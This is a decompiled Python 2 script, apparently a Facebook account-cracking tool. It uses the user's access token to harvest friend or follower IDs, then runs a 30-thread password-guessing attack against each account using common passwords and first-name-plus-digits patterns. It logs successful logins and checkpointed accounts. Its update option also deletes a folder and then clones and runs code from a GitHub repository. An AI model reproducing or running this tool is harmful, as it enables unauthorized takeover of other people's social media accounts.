# Deobfuscated by Uncompile
# Created by HTR-TECH (https://github.com/htr-tech)
# Instagram : @tahmid.rayat 

# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:53:57) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <debby>
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 lo.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
B = '\x1b[1;94m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
P = '\x1b[1;95m'
Y = '\x1b[1;93m'

def exb():
    print R + 'Exit'
    os.sys.exit()


def cb():
    os.system('clear')


def t():
    time.sleep(1)


def t1():
    time.sleep(0.01)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        t1()


def trb():
    os.system('rm -rf token.txt')


logo = ''
back = 0
successfull = []
checkpoint = []
oks = []
cps = []
id = []

def login():
    cb()
    try:
        tb = open('token.txt', 'r')
        menu()
    except (KeyError, IOError):
        cb()
        print logo
        print R + '\xe2\x97\x88\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81' + S + ' Login FACEBOOK Login ' + R + '\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\x88'
        print
        id = raw_input(S + '[\xe2\x98\x86] ' + S + 'Email: ' + G + '')
        pwd = getpass.getpass(S + '[\xe2\x99\xa1] ' + R + 'Password : ')
        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        z = json.load(data)
        if 'access_token' in z:
            st = open('token.txt', 'w')
            st.write(z['access_token'])
            st.close()
            print S + '[\xe2\x98\x86]' + Y + ' Login successfull 100% \xe2\x9c\x93'
            os.system('xdg-open https://www.youtube.com/channel/UCsKgUfkSEwpI4Tc3_SJSEsA')
            menu()
        elif 'www.facebook.com' in z['error_msg']:
            print R + 'Account has a checkpoint !'
            t()
            login()
        else:
            print R + 'number/user id/ password is wrong !'
            trb()
            t()
            login()


def menu():
    cb()
    try:
        tb = open('token.txt', 'r').read()
    except IOError:
        print R + 'Token Invalid !'
        trb()
        t()
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + tb)
        a = json.loads(otw.text)
    except KeyError:
        print G + 'Account has a checkpoint !'
        trb()
        t()
        login()
    except requests.exceptions.ConnectionError:
        print W + 'No internet connection !'
        t()
        exb()

    cb()
    print logo
    print S + '[\xe2\x98\x86] ' + G + 'ID Name: ' + R + a['name']
    print S + '[\xe2\x98\x86] ' + G + 'User ID: ' + R + a['id']
    print
    print S + 50 * '-'
    print
    print S + '[' + P + '\xe2\x98\x9e1' + S + ']' + S + ' New Hack Facebook'
    print S + '[' + P + '\xe2\x98\x9e2' + S + ']' + S + ' Update Hack Facebook'
    print S + '[' + P + '\xe2\x98\x9e3' + S + ']' + S + ' Youtube'
    print S + '[' + Y + '\xe2\x98\x9e4' + S + ']' + G + ' Log Out'
    print S + '[' + Y + '\xe2\x98\x9e0' + S + ']' + R + ' Exit'
    print
    print S + 50 * '-'
    print
    mb()


def mb():
    bm = raw_input(W + ' Number ')
    if bm == '':
        print R + 'Select a valid option !'
        mb()
    elif bm == '1':
        pak()
    elif bm == '2':
        os.system('rm -rf $HOME/heckfb')
        os.system('cd $HOME && git clone https://github.com/irulrul/lo.py')
        cb()
        print logo
        psb('\xe2\x98\x8610%')
        psb('\xe2\x98\x86\xe2\x98\x8620%')
        psb('\xe2\x98\x86\xe2\x98\x86\xe2\x98\x8630%')
        psb('\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x8640%')
        psb('\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x8650%')
        psb('\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x8660%')
        psb('\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x8670%')
        psb('\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x8680%')
        psb('\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x8690%')
        psb('\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86\xe2\x98\x86100%')
        psb('Frends login new Account\xe2\x9c\x93')
        psb('WElCOME')
        psb('Congratulations  Tool Has Been Updated Successfully')
        psb('\xf0\x9f\x94\x93User Name\xe2\x98\x86 mas\xe2\x9c\x93')
        psb('\xf0\x9f\x94\x93Password \xe2\x98\x86 love\xe2\x9c\x93')
        psb('Subscribe My Youtube Chennel\xe2\x9c\x93')
        psb('Please Login Again')
        time.sleep(2)
        os.system('cd $HOME/heckfb && python2 heckfb.py')
    elif bm == '3':
        os.system('xdg-open https://www.youtube.com/channel/UCsKgUfkSEwpI4Tc3_SJSEsA')
        menu()
    elif bm == '4':
        psb('Token Has Been Removed')
        trb()
        t()
        exb()
    elif bm == '0':
        exb()
    else:
        print R + 'Fill in correctly !'
        mb()


def pak():
    global tb
    try:
        tb = open('token.txt', 'r').read()
    except IOError:
        print R + ' Invalid Token !'
        trb()
        t()
        login()

    cb()
    print logo
    print S + '[' + P + '\xe2\x98\x9e1' + S + ']' + P + ' Crack With Friend List'
    print S + '[' + P + '\xe2\x98\x9e2' + S + ']' + P + ' Crack From Public Account'
    print S + '[' + Y + '\xe2\x98\x9e3' + S + ']' + Y + ' Crack From File'
    print S + '[' + R + '\xe2\x98\x9e0' + S + ']' + R + ' Back'
    print
    print S + 50 * '-'
    print
    pb()


def pb():
    global cps
    global oks
    bp = raw_input(W + ' Number :   ')
    if bp == '':
        print R + 'Select a valid option !'
        pb()
    elif bp == '1':
        cb()
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + tb)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif bp == '2':
        cb()
        print logo
        idt = raw_input(S + '[\xe2\x98\x86] ' + G + 'Put Public User ID/User Name: ' + W + '')
        cb()
        print logo
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + tb)
            op = json.loads(jok.text)
            psb(S + '[\xe2\x98\x86]' + G + ' Account  Name: ' + W + op['name'])
        except KeyError:
            print R + ' ID not found !'
            raw_input(R + ' Back')
            pak()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + tb)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif bp == '3':
        cb()
        print logo
        try:
            idlist = raw_input(S + '[\xe2\x98\x86] ' + R + 'Enter File Path: ' + G + '')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print R + ' File Not Fount !'
            raw_input(R + ' Back')
            pak()

    elif bp == '0':
        menu()
    else:
        print R + ' Select a valid option !'
        pb()
    print S + '[\xe2\x98\x86]' + P + ' Total Friends: ' + W + str(len(id))
    psb(S + '[\xe2\x98\x86]' + S + ' To stop process  click on CTRL ~ Z')
    print
    print S + 50 * '-'
    print

    def main(arg):
        user = arg
        try:
            h = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + tb)
            j = json.loads(h.text)
            ps1 = 'dancok'
            dt = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + ps1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            k = json.load(dt)
            if 'www.facebook.com' in k['error_msg']:
                print S + '[CP] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps1
                cps.append(user + ps1)
            elif 'access_token' in k:
                print G + '[OK] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps1
                oks.append(user + ps1)
            else:
                ps2 = j['first_name'] + '123'
                dt = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + ps2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                k = json.load(dt)
                if 'www.facebook.com' in k['error_msg']:
                    print S + '[CP] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps2
                    cps.append(user + ps2)
                elif 'access_token' in k:
                    print G + '[OK] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps2
                    oks.append(user + ps2)
                else:
                    ps3 = j['first_name'] + '1234'
                    dt = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + ps3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    k = json.load(dt)
                    if 'www.facebook.com' in k['error_msg']:
                        print S + '[CP] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps3
                        cps.append(user + ps3)
                    elif 'access_token' in k:
                        print G + '[OK] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps3
                        oks.append(user + ps3)
                    else:
                        ps4 = j['first_name'] + '12345'
                        dt = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + ps4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        k = json.load(dt)
                        if 'www.facebook.com' in k['error_msg']:
                            print S + '[CP] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps4
                            cps.append(user + ps4)
                        elif 'access_token' in k:
                            print G + '[OK] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps4
                            oks.append(user + ps4)
                        else:
                            ps5 = 'katasandi'
                            dt = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + ps5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            k = json.load(dt)
                            if 'www.facebook.com' in k['error_msg']:
                                print S + '[CP] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps5
                                cps.append(user + ps5)
                            elif 'access_token' in k:
                                print G + '[OK] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps5
                                oks.append(user + ps5)
                            else:
                                ps6 = 'sayang'
                                dt = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + ps6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                k = json.load(dt)
                                if 'www.facebook.com' in k['error_msg']:
                                    print S + '[CP] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps6
                                    cps.append(user + ps6)
                                elif 'access_token' in k:
                                    print G + '[OK] \xe2\x99\xa1 ' + user + ' \xe2\x99\xa1 ' + ps6
                                    oks.append(user + ps6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print
    print S + 50 * '-'
    print
    print S + 'Process has been completed CP ID Open After 7 Days '
    print Y + 'Total ' + G + 'OK' + S + '/' + P + 'CP' + S + ' = ' + G + str(len(oks)) + S + '/' + R + str(len(cps))
    print S + 'lo.py'
    print
    raw_input(R + 'Back')
    os.system('python2 lo.py')


if __name__ == '__main__':
    login()